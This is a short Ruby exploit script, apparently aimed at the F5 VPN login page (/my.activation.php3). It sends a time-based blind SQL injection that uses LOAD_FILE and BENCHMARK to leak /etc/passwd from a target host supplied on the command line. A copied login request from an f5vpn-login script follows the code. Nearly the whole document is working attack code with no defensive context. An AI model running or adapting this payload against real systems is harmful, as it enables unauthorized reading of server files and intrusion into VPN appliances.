#!/usr/bin/env ruby

require 'rex'

host = ARGV[0]

def usage
	puts "[*] #{$0} <ip>"
	exit
end

usage if ARGV.size < 1

sock = Rex::Proto::Http::Client.new(host, port = "443", context = {}, ssl = true)

data = "rsa_port=&vhost=standard&username=%(user)s&password=%(password)s&client_data=%(client_data)s&login=Logon&state=&mrhlogonform=1&miniui=1&tzoffsetmin=1&sessContentType=HTML&overpass=&lang=en&charset=iso-8859-1&uilang=en&uicharset=iso-8859-1&uilangchar=en.iso-8859-1&langswitcher="

sqli = "state=%2527+and+(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+"

req = sock.request_cgi(
	{
		'uri'   => "/my.activation.php3",
		'version' => '1.0',
		'method' => 'POST',
		'cookie' => 'VHOST=standard; uRoamTestCookie=TEST',
		'data' => sqli,
		'headers' =>
		{
			'Referer' => "https://#{host}/my.activation.php3",
		}
	})
# debug your request
# puts req

begin
	sock.send_request(req)
	data = sock.read_response()
	puts data.body
	#puts data.headers
	#puts data.code
rescue => e
	puts "[!] #{e.to_s}"
	exit
end
__END__
request taken from:

https://fuhm.net/software/f5vpn-login/f5vpn-login.py

def do_login(client_data, host, username, password):
    body="rsa_port=&vhost=standard&username=%(user)s&password=%(password)s&client_data=%(client_data)s&login=Logon&state=&mrhlogonform=1&miniui=1&tzoffsetmin=1&sessContentType=HTML&overpass=&lang=en&charset=iso-8859-1&uilang=en&uicharset=iso-8859-1&uilangchar=en.iso-8859-1&langswitcher=" % dict(user=quote_plus(username), password=quote_plus(password), client_data=client_data)

    request = """POST /my.activation.php3 HTTP/1.0\r
Accept: */*\r
Accept-Language: en\r
Cookie: VHOST=standard; uRoamTestCookie=TEST\r
Content-Type: application/x-www-form-urlencoded\r
Referer: https://%(host)s/my.activation.php3\r
User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.9.2\r
Host: %(host)s\r
Content-Length: %(len)d\r
\r
%(body)s
""" % dict(host=host, len=len(body), body=body)

